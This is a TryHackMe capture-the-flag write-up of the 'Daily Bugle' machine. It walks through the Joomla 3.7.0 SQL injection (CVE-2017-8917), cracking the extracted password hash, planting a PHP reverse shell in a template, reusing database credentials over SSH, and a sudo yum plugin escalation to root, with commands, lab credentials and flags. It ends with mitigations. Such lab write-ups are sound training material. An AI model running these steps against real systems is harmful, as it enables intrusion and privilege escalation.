---
layout: post
title: Daily Bugle
subtitle: TryHackMe Writeup - Daily Bugle
description: Compromise a Joomla CMS account via SQL injection, crack password hashes, and escalate privileges using a YUM misconfiguration.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/5a1494ff275a366be8418a9bf831847c.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/5a1494ff275a366be8418a9bf831847c.png
category: tryhackme
tags:
  - TryHackMe
  - Joomla
  - SQL Injection
  - Privilege Escalation
  - YUM
  - GTFOBins
  - CVE-2017-8917
author: mustafa_altayeb
date: 2025-09-03 00:00:00 +0000
paginate: true
---

# Daily Bugle - TryHackMe Writeup

[Daily Bugle](https://tryhackme.com/room/dailybugle) is a medium-difficulty Linux machine that focuses on web application security, specifically targeting Joomla CMS vulnerabilities and Linux privilege escalation techniques.

**Difficulty**: Medium ⭐⭐  
**Operating System**: CentOS Linux  
**Themes**: Web Exploitation, SQL Injection, Password Cracking, Linux Privilege Escalation

---

## Objectives

1. Identify and exploit Joomla CMS vulnerability
2. Extract and crack password hashes
3. Gain initial shell access
4. Escalate privileges through YUM misconfiguration
5. Capture user and root flags

---

## Reconnaissance

### Nmap Scan

Performed a comprehensive service version scan:

```bash
nmap -sCV -Pn 10.10.172.83
```

**Results**:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4
80/tcp   open  http    Apache httpd 2.4.6 (CentOS) PHP/5.6.40
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
|_/joomla/administrator/ /administrator/ /bin/ /cache/ ...
3306/tcp open  mysql   MariaDB 10.3.23 or earlier
```

**Key Findings**:
- **Port 80**: Joomla CMS running on Apache
- **Port 3306**: MariaDB database (potential SQL injection target)
- **robots.txt**: Reveals administrator paths and sensitive directories

### Web Enumeration

The website displays a Spider-Man themed "Daily Bugle" newspaper:

![Daily Bugle Homepage](/assets/TryHackMeRoomsImage/DailyBugle/image1.png)

Accessed the Joomla administrator panel:

![Joomla Admin Login](/assets/TryHackMeRoomsImage/DailyBugle/image2.png)

### Version Discovery

Used `dirsearch` to find hidden files:

```bash
dirsearch -u http://10.10.172.83
```

Found `README.txt` revealing **Joomla 3.7.0**:

![Joomla Version](/assets/TryHackMeRoomsImage/DailyBugle/image3.png)

**Vulnerability Identified**: Joomla 3.7.0 is vulnerable to SQL injection (CVE-2017-8917)

---

## Initial Access

### SQL Injection Exploitation

Used the Joomla SQL injection exploit script:

```bash
git clone https://github.com/stefanlucas/Exploit-Joomla.git
cd Exploit-Joomla
python3 JoomlaExploit.py http://10.10.172.83
```

**Output**:
```
Found table: fb9j5_users
Extracting users from fb9j5_users
Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
```

### Password Cracking

1. **Save the hash**:
   ```bash
   echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > hash.txt
   ```

2. **Crack with JohnTheRipper**:
   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
   ```

**Credentials Found**:
- Username: `jonah`
- Password: `spiderman123`

### Joomla Admin Access

Logged into Joomla admin panel (`/administrator/`) with discovered credentials:

![Joomla Admin Dashboard](/assets/TryHackMeRoomsImage/DailyBugle/image4.png)

### Reverse Shell Deployment

1. **Navigate to Template Editor**:
   - Extensions → Templates → Templates → Protostar Details and Files

2. **Edit index.php**:
   Replaced content with PHP reverse shell from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell)

3. **Start Listener**:
   ```bash
   nc -nlvp 9999
   ```

4. **Trigger Shell**:
   Accessed the homepage to execute the modified template

**Shell Obtained**:
```bash
uid=48(apache) gid=48(apache) groups=48(apache)
```

### Credential Discovery

Found database credentials in configuration file:

```bash
cat /var/www/html/configuration.php
```

**Extracted Credentials**:
```php
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
public $db = 'joomla';
```

### SSH Access

Used discovered credentials for SSH access:

```bash
ssh jjameson@10.10.172.83
Password: nv5uz9r3ZEDzVjNu
```

**User Shell Obtained**:
```bash
[jjameson@dailybugle ~]$ whoami
jjameson
```

---

## Privilege Escalation

### Sudo Privilege Enumeration

```bash
sudo -l
```

**Output**:
```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

### YUM Privilege Escalation

Referenced [GTFOBins YUM](https://gtfobins.github.io/gtfobins/yum/) for exploitation methods:

![GTFOBins Reference](/assets/TryHackMeRoomsImage/DailyBugle/image5.png)

**Method 1**: RPM package creation (failed - fpm not installed)

**Method 2**: YUM Plugin Exploitation (successful):

```bash
# Create temporary directory
TF=$(mktemp -d)

# Create YUM configuration
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

# Create plugin configuration
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

# Create malicious plugin
cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

# Execute with sudo
sudo yum -c $TF/x --enableplugin=y
```

**Root Access Obtained**:
```bash
sh-4.2# whoami
root
```

---

## Flag Capture

### User Flag

```bash
cat /home/jjameson/user.txt
```
**Flag**: `27a260fe3cba712cfdedb1c86d80442e`

### Root Flag

```bash
cat /root/root.txt
```
**Flag**: `eec3d53292b1821868266858d7fa6f79`

---

## Key Takeaways

### Attack Path Summary:
```
Port Scanning → Joomla Discovery → Version Identification → 
SQL Injection → Hash Extraction → Password Cracking → 
Joomla Admin Access → Reverse Shell → Credential Discovery → 
SSH Access → Sudo Enumeration → YUM Exploitation → Root Access
```

### Vulnerabilities Exploited:
1. **CVE-2017-8917** - Joomla 3.7.0 SQL Injection
2. **Weak Password** - Crackable bcrypt hash
3. **Credential Reuse** - Database password used for SSH
4. **YUM Misconfiguration** - Sudo privileges without password

### Mitigation Strategies:
1. **For Joomla Security**:
   - Regular updates and patching
   - Strong password policies
   - Input validation and sanitization
   - Regular security audits

2. **For Linux Security**:
   - Principle of least privilege for sudo access
   - Regular review of sudo permissions
   - Secure credential storage
   - Application whitelisting

3. **For Database Security**:
   - Unique passwords for different services
   - Regular password rotation
   - Database encryption
   - Restricted network access

### Tools Used:
- **Nmap** - Network reconnaissance
- **Dirsearch** - Web directory enumeration
- **Exploit-Joomla** - SQL injection exploitation
- **JohnTheRipper** - Password cracking
- **GTFOBins** - Privilege escalation reference
- **Netcat** - Reverse shell handling

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

**Find me online**:  
• TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)  
• LinkedIn: [Mustafa Altayeb](https://www.linkedin.com/in/t4t4r1s)  
• X: [@mustafa_altayeb](https://x.com/t4t4r1s)

---
